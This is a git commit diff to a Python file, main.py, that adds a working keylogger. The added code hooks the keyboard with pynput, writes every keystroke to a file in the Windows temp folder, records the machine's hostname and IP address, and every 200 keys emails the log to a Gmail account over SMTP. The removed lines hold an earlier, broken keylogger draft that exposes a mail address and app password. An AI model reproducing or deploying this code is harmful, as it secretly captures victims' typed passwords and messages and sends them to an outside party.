24f23da209b3f4079aee8c8bba21854196b71e62
mazarra <77664502+mazarra@users.noreply.github.com>
2023-11-09 20:06:50 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,8 @@
+from pynput.keyboard import Key, Listener
+import socket
+host_name = socket.gethostname()
+ip_address = socket.gethostbyname(host_name)
+import os
 import email, smtplib, ssl
 
 from email import encoders
@@ -6,96 +11,57 @@ from email.mime.application import MIMEApplication
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+log_dir = str(os.getenv('temp')) + '\\'
 
-def send_mail():
-	port = 465
-	sender_email = "dasadfs92@gmail.com"
-	receiver_email = "jestemmazur1234567@gmail.com"
+x = open(log_dir + 'keylogs.txt', 'w')
+x.close()
+z = 0
+def on_press(key):
+    y = 9
+    if key:
+        global z 
+        z = z + 1
+        x = open(log_dir + 'keylogs.txt', 'a')
+        if key == Key.enter:
+            x.write("\n")
+        elif key == Key.caps_lock:
+            if y == 9:
+                y = y+1
+            else:
+                y = 9
+        elif key == Key.space:
+            x.write(" ")
+        else:
+            if y == 10:
+                x.write(str(key)[1].upper())
+            else:
+                x.write(str(key)[1])
+        if z > 200:
+            send_email(host_name, ip_address)
+            z=0
+def send_email(host_name, ip_address):
+    port = 465
+    sender_email = "ggg@gmail.com"
+    receiver_email = "ggg@gmail.com"
 
-	# Create a multipart message and set headers
-	message = MIMEMultipart()
-	message["From"] = sender_email
-	message["To"] = receiver_email
-	files = ["cyk.txt"]
-	for f in files or []:
-	   with open(f, "rb") as fil:
-	       part = MIMEApplication(
-	           fil.read(),
-	           Name=basename(f)
-	       )
-	   # After the file is closed
-	   part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
-	   message.attach(part)
-	context = ssl.create_default_context()
+    # Create a multipart message and set headers
+    message = MIMEMultipart()
+    message["From"] = sender_email
+    message["To"] = receiver_email
+    files = [log_dir +"keylogs.txt"]
+    for f in files or []:
+       with open(f, "rb") as fil:
+           part = MIMEApplication(
+               fil.read(),
+               Name=basename(f)
+           )
+       # After the file is closed
+       part['Content-Disposition'] = 'attachment; filename="%s"' % basename(f)
+       message.attach(part)
+    context = ssl.create_default_context()
 
-	with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
-	    server.login(sender_email, "ugxm bias eidn abyk")
-	    server.sendmail(sender_email, receiver_email,message.as_string())
-
-class Keylogger:
-    def __init__(self, interval):
-        # we gonna pass SEND_REPORT_EVERY to interval
-        self.interval = interval
-        self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
-	def callback(self, event):
-
-	     name = event.name
-		if len(name) > 1:
-	     if name == "space":
-		           # " " instead of "space"
-           name = " "
-	       elif name == "enter":
-	           # add a new line whenever an ENTER is pressed
-	           name = "[ENTER]\n"
-	       elif name == "decimal":
-	           name = "."
-	       else:
-	           # replace spaces with underscores
-	           name = name.replace(" ", "_")
-	           name = f"[{name.upper()}]"
-	   # finally, add the key name to our global `self.log` variable
-    def update_filename(self):
-        # construct the filename to be identified by start & end datetimes
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"cyk"
-
-    def report_to_file(self):
-        """This method creates a log file in the current directory that contains
-        the current keylogs in the `self.log` variable"""
-        # open the file in write mode (create it)
-        with open(f"{self.filename}.txt", "w") as f:
-            # write the keylogs to the file
-            print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
-    def report(self):
-       self.update_filename()
-       sendmail()
-       x= open("cyk.txt", "w")
-       x.close()
-        timer = Timer(interval=self.interval, function=self.report)
-        # set the thread as daemon (dies when main thread die)
-        timer.daemon = True
-        # start the timer
-        timer.start()
-"""
-//
-//
-//
-//
-//
-//
-//
-//
-//
-//
-//
-//
-//
-//
-//
-//
-//
-//
-"""
+    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
+        server.login(sender_email, "pwd")
+        server.sendmail(sender_email, receiver_email,message.as_string())
+with Listener(on_press=on_press) as listener:
+    listener.join()
